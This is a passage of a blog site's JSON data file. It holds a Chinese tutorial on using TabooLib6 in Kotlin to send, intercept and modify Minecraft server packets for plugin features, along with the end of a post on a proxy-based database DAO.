class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exampleTable\"</span> <span class=\"token punctuation\">,</span>ExampleDAO<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><h3 id=\"平台\"><a href=\"#平台\" class=\"headerlink\" title=\"平台\"></a>平台</h3><p>最开始其实我是想做成跨平台项目的，然后提供TabooLib的实现。</p>\n<p>然后我发现说实话我对跨平台设计还不是特别了解，于是最后一气之下换成了TabooLib单平台实现。</p>\n<h3 id=\"动态代理\"><a href=\"#动态代理\" class=\"headerlink\" title=\"动态代理\"></a>动态代理</h3><p>最开始其实我是完全没有头绪的，后面看了一下Room的使用方法，麻木的仿写出了一套写法</p>\n<p>后来再看了一遍这个写法，联想到了Retrofit，然后想到了Retrofit的底层实现是动态代理</p>\n<p>说实话以前没有用过动态代理，于是就去了解了一下子</p>\n<p>最后发现这个项目的灵魂就在动态代理，而且其实代码量并不多</p>\n<h3 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h3><ul>\n<li>Kotlin接口方法默认实现不是基于JDK8以后的default关键字，而是在接口里生成了一个静态内部类以静态方法的形式存放</li>\n<li>ResultSet应该以迭代器的方式使用</li>\n<li>获取父类&#x2F;接口的泛型应该使用genericSuperClass&#x2F;Interfaces</li>\n<li>返回值类型为void或Unit的方法的returnType不是Void::class.java,也不是Unit::class.java。但它可以用returnType.name &#x3D;&#x3D; “void”这种形式进行判断</li>\n</ul>\n"},{"title":"利用TabooLib6发送/拦截/修改数据包以实现梦想中的特性","date":"2021-09-28T01:20:43.000Z","author":"寒雨","hide":false,"summary":"写了一篇TabooLib数据包控制技巧的教程","_content":"\n## 前言\n\n在如今的插件开发者社区中，利用NMS底层的数据包功能实现一些游戏特性已经不再稀奇。例如坏黑大佬的Adyeshach和Arasple的TrMenu，它们的功能全部依靠数据包实现。\n\n本文将尝试让读者从一定程度上理解数据包，而不是仅仅扔出一段一段的代码...\n\n由于文章作者很少涉猎1.17版本的插件开发，所以这篇文章的部分内容只对1.16.5及以下版本适用\n\n由于文章作者是个菜逼，所以部分内容甚至是整片文章对于数据包的论述可能十分片面，大佬轻喷\n\n**文章作者也是菜鸟，文章内容如有谬误烦请各位大佬指正**\n\n## 从一定程度上理解数据包\n\n你也许听说过数据包这个东西，但是你真的知道它是什么吗？\n\n那么你有没有想过，**服务器**是如何控制玩家**客户端**的显示效果的呢？\n\n答案是向玩家客户端发送数据包，然后客户端按照数据包的内容执行游戏效果。\n\n举个例子:\n\n> 玩家因为某种原因扣血了\n>\n> 1. 服务端将内存中储存的玩家血量修改为扣血后的值\n> 2. 向客户端发送一个PacketPlayOutUpdateHealth数据包\n> 3. 客户端按照数据包中的内容修改了玩家屏幕上显示的血量\n\n那么你应该已经想到这个环节我们可以怎么操作了\n\n> 1.我们自己手动向玩家的客户端发送数据包，让玩家看到假的效果 （比如上面的例子，我们可以给玩家制造一个扣血的“假象”）\n>\n> 2.我们修改服务端发送的数据包，修改里面的字段，让玩家看到我们想让他们看到的效果 (比如玩家扣了10点血，但是我可以让他看起来只扣了1点血，但是服务端里记录的玩家真实生命值仍然扣除了10点)\n>\n> 3.拦截数据包，直接让玩家看不到这个效果 （玩家被打了，可玩家客户端上显示没有扣血，实际上扣了）\n\n### 数据包的命名规则\n\n每一种数据包都是NMS底层的一个类，他们的位置都在net.minecraft.server.<版本号>这个包下\n\n我们来拆分一下PacketPlayOutUpdateHealth这个数据包的名称\n\nPacket(Play)(Out)(UpdateHealth)\n\nPlay: 数据包的发送的四种状态之一 （HandShake, Status, Login, Play）\n\nOut: Out/In -> Out即为服务端向客户端发送的数据包，In则相反\n\nUpdateHealth: 这个数据包的作用，这里是指更新玩家客户端的健康状态\n\n由此我们便大致可以猜测数据包的作用\n\n当然，如果你不是很确定的话，还是查查[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)吧\n\n### 数据包字段\n\n在我们通过反编译查看数据包类的内容时，一般我们会发现一些字段。这些字段的字段名一般都是a，b，c之类的字母，我们无法从字段名中推测这个字段的值代表的东西。\n\n而无论是发包还是修改数据包，我们都必须理解这个数据包的字段所代表的意义才行。\n\n[![image-20210928084148586](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)\n\n一般这种情况下，我们会查阅[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n[![image-20210928084449744](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)\n\n于是通过查询wiki，我们基本确定了数据包中字段代表的意义 a -> 生命值 b -> 饱食度 c -> 食物饱和度\n\n请注意，**少数时候反编译出来的字段并不按wiki中表格的顺序排列**（例如PacketPlayOutExperience），你需要结合字段类型来判断字段在wiki上对应的字段\n\n有时多个字段类型一样，千万要多试。\n\n虽然wiki是个很方便的东西，但wiki上也不是什么都有的。事实上，有很多数据包的字段，还有一些DataWatcher之类的杂七杂八的东西没有被wiki标注字段名称和Notes。这时候我们不能怕困难，怼着NMS代码啃就完事了！\n\nTips: 有针对性的去寻找NMS代码，从跟你想要实现的功能有一定关系的BukkitAPI方法入手，顺藤摸瓜草到CraftBukkit再溯源到NMS\n\n### 使用TabooLib6发送/修改/拦截数据包\n\n#### 发送\n\n使用TabooLib的牛逼NMS版本控制工具，直接写NMS代码来发送数据包\n\n**接口部分**\n\n```kotlin\ninterface NMS {\n    \n    /**\n     * 刷新饱食度条\n     *\n     * @param p 玩家\n     */\n    fun updateFoodBar(p: Player)\n\n    companion object {\n        // 经过版本控制的实例，可以在任意版本放心使用\n        // 在同一个包下创建一个实现类，取名为<接口名>Impl即可\n        val handle by lazy {\n            nmsProxy<NMS>()\n        }\n    }\n}\n```\n\n**实现部分**\n\n```kotlin\nclass NMSImpl : NMS {\n    \n    // 没错，直接用nms，不用担心版本的问题\n    override fun updateFoodBar(p: Player) {\n        val foodData = (p as CraftPlayer).handle.foodData\n        p.handle.playerConnection.sendPacket(PacketPlayOutUpdateHealth(p.scaledHealth, foodData.foodLevel, foodData.saturationLevel))\n    }\n    \n}\n```\n\n#### 拦截/修改\n\nTabooLib6将服务器数据包通讯包装为了两个事件，我们直接通过监听这个事件即可实现数据包的拦截与修改\n\n监听名称中含有Out这个单词的数据包就用PacketSendEvent，In就用PacketReceiveEvent\n\n接下来我给段实例代码，自己去悟吧\n\n```kotlin\n@SubscribeEvent\nfun e(e: PacketSendEvent) {\n\t// 对数据包类型的判断\n    if (e.packet.name == \"PacketPlayOutExperience\") {\n        val v = expTempValue[e.player.name]\n        // 读取数据包中字段的值\n        val level = e.packet.read<Int>(\"c\")\n        // 将值写入数据包中的字段\n        e.packet.write(\"a\", v ?: 0.0f)\n        e.packet.write(\"c\", 0)\n        // 取消事件，意思是直接把这个数据包拦截下来了\n        e.isCancelled = true\n    }\n}\n```","source":"_posts/taboolib6-packet-control.md","raw":"---\ntitle: 利用TabooLib6发送/拦截/修改数据包以实现梦想中的特性\ndate: 2021-9-28 09:20:43\nauthor: 寒雨\nhide: false\nsummary: 写了一篇TabooLib数据包控制技巧的教程\ncategories: 教程\ntags:\n  - TabooLib\n  - Kotlin\n---\n\n## 前言\n\n在如今的插件开发者社区中，利用NMS底层的数据包功能实现一些游戏特性已经不再稀奇。例如坏黑大佬的Adyeshach和Arasple的TrMenu，它们的功能全部依靠数据包实现。\n\n本文将尝试让读者从一定程度上理解数据包，而不是仅仅扔出一段一段的代码...\n\n由于文章作者很少涉猎1.17版本的插件开发，所以这篇文章的部分内容只对1.16.5及以下版本适用\n\n由于文章作者是个菜逼，所以部分内容甚至是整片文章对于数据包的论述可能十分片面，大佬轻喷\n\n**文章作者也是菜鸟，文章内容如有谬误烦请各位大佬指正**\n\n## 从一定程度上理解数据包\n\n你也许听说过数据包这个东西，但是你真的知道它是什么吗？\n\n那么你有没有想过，**服务器**是如何控制玩家**客户端**的显示效果的呢？\n\n答案是向玩家客户端发送数据包，然后客户端按照数据包的内容执行游戏效果。\n\n举个例子:\n\n> 玩家因为某种原因扣血了\n>\n> 1. 服务端将内存中储存的玩家血量修改为扣血后的值\n> 2. 向客户端发送一个PacketPlayOutUpdateHealth数据包\n> 3. 客户端按照数据包中的内容修改了玩家屏幕上显示的血量\n\n那么你应该已经想到这个环节我们可以怎么操作了\n\n> 1.我们自己手动向玩家的客户端发送数据包，让玩家看到假的效果 （比如上面的例子，我们可以给玩家制造一个扣血的“假象”）\n>\n> 2.我们修改服务端发送的数据包，修改里面的字段，让玩家看到我们想让他们看到的效果 (比如玩家扣了10点血，但是我可以让他看起来只扣了1点血，但是服务端里记录的玩家真实生命值仍然扣除了10点)\n>\n> 3.拦截数据包，直接让玩家看不到这个效果 （玩家被打了，可玩家客户端上显示没有扣血，实际上扣了）\n\n### 数据包的命名规则\n\n每一种数据包都是NMS底层的一个类，他们的位置都在net.minecraft.server.<版本号>这个包下\n\n我们来拆分一下PacketPlayOutUpdateHealth这个数据包的名称\n\nPacket(Play)(Out)(UpdateHealth)\n\nPlay: 数据包的发送的四种状态之一 （HandShake, Status, Login, Play）\n\nOut: Out/In -> Out即为服务端向客户端发送的数据包，In则相反\n\nUpdateHealth: 这个数据包的作用，这里是指更新玩家客户端的健康状态\n\n由此我们便大致可以猜测数据包的作用\n\n当然，如果你不是很确定的话，还是查查[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)吧\n\n### 数据包字段\n\n在我们通过反编译查看数据包类的内容时，一般我们会发现一些字段。这些字段的字段名一般都是a，b，c之类的字母，我们无法从字段名中推测这个字段的值代表的东西。\n\n而无论是发包还是修改数据包，我们都必须理解这个数据包的字段所代表的意义才行。\n\n[![image-20210928084148586](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)\n\n一般这种情况下，我们会查阅[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n[![image-20210928084449744](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)\n\n于是通过查询wiki，我们基本确定了数据包中字段代表的意义 a -> 生命值 b -> 饱食度 c -> 食物饱和度\n\n请注意，**少数时候反编译出来的字段并不按wiki中表格的顺序排列**（例如PacketPlayOutExperience），你需要结合字段类型来判断字段在wiki上对应的字段\n\n有时多个字段类型一样，千万要多试。\n\n虽然wiki是个很方便的东西，但wiki上也不是什么都有的。事实上，有很多数据包的字段，还有一些DataWatcher之类的杂七杂八的东西没有被wiki标注字段名称和Notes。这时候我们不能怕困难，怼着NMS代码啃就完事了！\n\nTips: 有针对性的去寻找NMS代码，从跟你想要实现的功能有一定关系的BukkitAPI方法入手，顺藤摸瓜草到CraftBukkit再溯源到NMS\n\n### 使用TabooLib6发送/修改/拦截数据包\n\n#### 发送\n\n使用TabooLib的牛逼NMS版本控制工具，直接写NMS代码来发送数据包\n\n**接口部分**\n\n```kotlin\ninterface NMS {\n    \n    /**\n     * 刷新饱食度条\n     *\n     * @param p 玩家\n     */\n    fun updateFoodBar(p: Player)\n\n    companion object {\n        // 经过版本控制的实例，可以在任意版本放心使用\n        // 在同一个包下创建一个实现类，取名为<接口名>Impl即可\n        val handle by lazy {\n            nmsProxy<NMS>()\n        }\n    }\n}\n```\n\n**实现部分**\n\n```kotlin\nclass NMSImpl : NMS {\n    \n    // 没错，直接用nms，不用担心版本的问题\n    override fun updateFoodBar(p: Player) {\n        val foodData = (p as CraftPlayer).handle.foodData\n        p.handle.playerConnection.sendPacket(PacketPlayOutUpdateHealth(p.scaledHealth, foodData.foodLevel, foodData.saturationLevel))\n    }\n    \n}\n```\n\n#### 拦截/修改\n\nTabooLib6将服务器数据包通讯包装为了两个事件，我们直接通过监听这个事件即可实现数据包的拦截与修改\n\n监听名称中含有Out这个单词的数据包就用PacketSendEvent，In就用PacketReceiveEvent\n\n接下来我给段实例代码，自己去悟吧\n\n```kotlin\n@SubscribeEvent\nfun e(e: PacketSendEvent) {\n\t// 对数据包类型的判断\n    if (e.packet.name == \"PacketPlayOutExperience\") {\n        val v = expTempValue[e.player.name]\n        // 读取数据包中字段的值\n        val level = e.packet.read<Int>(\"c\")\n        // 将值写入数据包中的字段\n        e.packet.write(\"a\", v ?: 0.0f)\n        e.packet.write(\"c\", 0)\n        // 取消事件，意思是直接把这个数据包拦截下来了\n        e.isCancelled = true\n    }\n}\n```","slug":"taboolib6-packet-control","published":1,"updated":"2021-11-13T16:16:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtw002ksfkl1hhcetty","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在如今的插件开发者社区中，利用NMS底层的数据包功能实现一些游戏特性已经不再稀奇。例如坏黑大佬的Adyeshach和Arasple的TrMenu，它们的功能全部依靠数据包实现。</p>\n<p>本文将尝试让读者从一定程度上理解数据包，而不是仅仅扔出一段一段的代码…</p>\n<p>由于文章作者很少涉猎1.17版本的插件开发，所以这篇文章的部分内容只对1.16.5及以下版本适用</p>\n<p>由于文章作者是个菜逼，所以部分内容甚至是整片文章对于数据包的论述可能十分片面，大佬轻喷</p>\n<p><strong>文章作者也是菜鸟，文章内容如有谬误烦请各位大佬指正</strong></p>\n<h2 id=\"从一定程度上理解数据包\"><a href=\"#从一定程度上理解数据包\" class=\"headerlink\" title=\"从一定程度上理解数据包\"></a>从一定程度上理解数据包</h2><p>你也许听说过数据包这个东西，但是你真的知道它是什么吗？</p>\n<p>那么你有没有想过，<strong>服务器</strong>是如何控制玩家<strong>客户端</strong>的显示效果的呢？</p>\n<p>答案是向玩家客户端发送数据包，然后客户端按照数据包的内容执行游戏效果。</p>\n<p>举个例子:</p>\n<blockquote>\n<p>玩家因为某种原因扣血了</p>\n<ol>\n<li>服务端将内存中储存的玩家血量修改为扣血后的值</li>\n<li>向客户端发送一个PacketPlayOutUpdateHealth数据包</li>\n<li>客户端按照数据包中的内容修改了玩家屏幕上显示的血量</li>\n</ol>\n</blockquote>\n<p>那么你应该已经想到这个环节我们可以怎么操作了</p>\n<blockquote>\n<p>1.我们自己手动向玩家的客户端发送数据包，让玩家看到假的效果 （比如上面的例子，我们可以给玩家制造一个扣血的“假象”）</p>\n<p>2.我们修改服务端发送的数据包，修改里面的字段，让玩家看到我们想让他们看到的效果 (比如玩家扣了10点血，但是我可以让他看起来只扣了1点血，但是服务端里记录的玩家真实生命值仍然扣除了10点)</p>\n<p>3.拦截数据包，直接让玩家看不到这个效果 （玩家被打了，可玩家客户端上显示没有扣血，实际上扣了）</p>\n</blockquote>\n<h3 id=\"数据包的命名规则\"><a href=\"#数据包的命名规则\" class=\"headerlink\" title=\"数据包的命名规则\"></a>数据包的命名规则</h3><p>每一种数据包都是NMS底层的一个类，他们的位置都在net.minecraft.server.&lt;版本号&gt;这个包下</p>\n<p>我们来拆分一下PacketPlayOutUpdateHealth这个数据包的名称</p>\n<p>Packet(Play)(Out)(UpdateHealth)</p>\n<p>Play: 数据包的发送的四种状态之一 （HandShake, Status, Login, Play）</p>\n<p>Out: Out/In -&gt; Out即为服务端向客户端发送的数据包，In则相反</p>\n<p>UpdateHealth: 这个数据包的作用，这里是指更新玩家客户端的健康状态</p>\n<p>由此我们便大致可以猜测数据包的作用</p>\n<p>当然，如果你不是很确定的话，还是查查<a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a>吧</p>\n<h3 id=\"数据包字段\"><a href=\"#数据包字段\" class=\"headerlink\" title=\"数据包字段\"></a>数据包字段</h3><p>在我们通过反编译查看数据包类的内容时，一般我们会发现一些字段。这些字段的字段名一般都是a，b，c之类的字母，我们无法从字段名中推测这个字段的值代表的东西。</p>\n<p>而无论是发包还是修改数据包，我们都必须理解这个数据包的字段所代表的意义才行。</p>\n<p><a href=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\"><img src=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\" alt=\"image-20210928084148586\"></a></p>\n<p>一般这种情况下，我们会查阅<a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<p><a href=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\"><img src=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\" alt=\"image-20210928084449744\"></a></p>\n<p>于是通过查询wiki，我们基本确定了数据包中字段代表的意义 a -&gt; 生命值 b -&gt; 饱食度 c -&gt; 食物饱和度</p>\n<p>请注意，<strong>少数时候反编译出来的字段并不按wiki中表格的顺序排列</strong>（例如PacketPlayOutExperience），你需要结合字段类型来判断字段在wiki上对应的字段</p>\n<p>有时多个字段类型一样，千万要多试。</p>\n<p>虽然wiki是个很方便的东西，但wiki上也不是什么都有的。事实上，有很多数据包的字段，还有一些DataWatcher之类的杂七杂八的东西没有被wiki标注字段名称和Notes。这时候我们不能怕困难，怼着NMS代码啃就完事了！</p>\n<p>Tips: 有针对性的去寻找NMS代码，从跟你想要实现的功能有一定关系的BukkitAPI方法入手，顺藤摸瓜草到CraftBukkit再溯源到NMS</p>\n<h3 id=\"使用TabooLib6发送-x2F-修改-x2F-拦截数据包\"><a href=\"#使用TabooLib6发送-x2F-修改-x2F-拦截数据包\" class=\"headerlink\" title=\"使用TabooLib6发送/修改/拦截数据包\"></a>使用TabooLib6发送/修改/拦截数据包</h3><h4 id=\"发送\"><a href=\"#发送\" class=\"headerlink\" title=\"发送\"></a>发送</h4><p>使用TabooLib的牛逼NMS版本控制工具，直接写NMS代码来发送数据包</p>\n<p><strong>接口部分</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">interface</span> NMS <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token comment\">/**\n     * 刷新饱食度条\n     *\n     * @param p 玩家\n     */</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 经过版本控制的实例，可以在任意版本放心使用</span>\n        <span class=\"token comment\">// 在同一个包下创建一个实现类，取名为&lt;接口名&gt;Impl即可</span>\n        <span class=\"token keyword\">val</span> handle <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n            nmsProxy<span class=\"token operator\">&lt;</span>NMS<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>实现部分</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> NMSImpl <span class=\"token operator\">:</span> NMS <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token comment\">// 没错，直接用nms，不用担心版本的问题</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> foodData <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token keyword\">as</span> CraftPlayer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>foodData\n        p<span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>playerConnection<span class=\"token punctuation\">.</span><span class=\"token function\">sendPacket</span><span class=\"token punctuation\">(</span><span class=\"token function\">PacketPlayOutUpdateHealth</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>scaledHealth<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>foodLevel<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>saturationLevel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"拦截-x2F-修改\"><a href=\"#拦截-x2F-修改\" class=\"headerlink\" title=\"拦截/修改\"></a>拦截/修改</h4><p>TabooLib6将服务器数据包通讯包装为了两个事件，我们直接通过监听这个事件即可实现数据包的拦截与修改</p>\n<p>监听名称中含有Out这个单词的数据包就用PacketSendEvent，In就用PacketReceiveEvent</p>\n<p>接下来我给段实例代码，自己去悟吧</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@SubscribeEvent</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PacketSendEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// 对数据包类型的判断</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"PacketPlayOutExperience\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> v <span class=\"token operator\">=</span> expTempValue<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n        <span class=\"token comment\">// 读取数据包中字段的值</span>\n        <span class=\"token keyword\">val</span> level <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>read<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 将值写入数据包中的字段</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">?:</span> <span class=\"token number\">0.0f</span><span class=\"token punctuation\">)</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 取消事件，意思是直接把这个数据包拦截下来了</span>\n        e<span class=\"token punctuation\">.</span>isCancelled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>在如今的插件开发者社区中，利用NMS底层的数据包功能实现一些游戏特性已经不再稀奇。例如坏黑大佬的Adyeshach和Arasple的TrMenu，它们的功能全部依靠数据包实现。</p>\n<p>本文将尝试让读者从一定程度上理解数据包，而不是仅仅扔出一段一段的代码…</p>\n<p>由于文章作者很少涉猎1.17版本的插件开发，所以这篇文章的部分内容只对1.16.5及以下版本适用</p>\n<p>由于文章作者是个菜逼，所以部分内容甚至是整片文章对于数据包的论述可能十分片面，大佬轻喷</p>\n<p><strong>文章作者也是菜鸟，文章内容如有谬误烦请各位大佬指正</strong></p>\n<h2 id=\"从一定程度上理解数据包\"><a href=\"#从一定程度上理解数据包\" class=\"headerlink\" title=\"从一定程度上理解数据包\"></a>从一定程度上理解数据包</h2><p>你也许听说过数据包这个东西，但是你真的知道它是什么吗？</p>\n<p>那么你有没有想过，<strong>服务器</strong>是如何控制玩家<strong>客户端</strong>的显示效果的呢？</p>\n<p>答案是向玩家客户端发送数据包，然后客户端按照数据包的内容执行游戏效果。</p>\n<p>举个例子:</p>\n<blockquote>\n<p>玩家因为某种原因扣血了</p>\n<ol>\n<li>服务端将内存中储存的玩家血量修改为扣血后的值</li>\n<li>向客户端发送一个PacketPlayOutUpdateHealth数据包</li>\n<li>客户端按照数据包中的内容修改了玩家屏幕上显示的血量</li>\n</ol>\n</blockquote>\n<p>那么你应该已经想到这个环节我们可以怎么操作了</p>\n<blockquote>\n<p>1.我们自己手动向玩家的客户端发送数据包，让玩家看到假的效果 （比如上面的例子，我们可以给玩家制造一个扣血的“假象”）</p>\n<p>2.我们修改服务端发送的数据包，修改里面的字段，让玩家看到我们想让他们看到的效果 (比如玩家扣了10点血，但是我可以让他看起来只扣了1点血，但是服务端里记录的玩家真实生命值仍然扣除了10点)</p>\n<p>3.拦截数据包，直接让玩家看不到这个效果 （玩家被打了，可玩家客户端上显示没有扣血，实际上扣了）</p>\n</blockquote>\n<h3 id=\"数据包的命名规则\"><a href=\"#数据包的命名规则\" class=\"headerlink\" 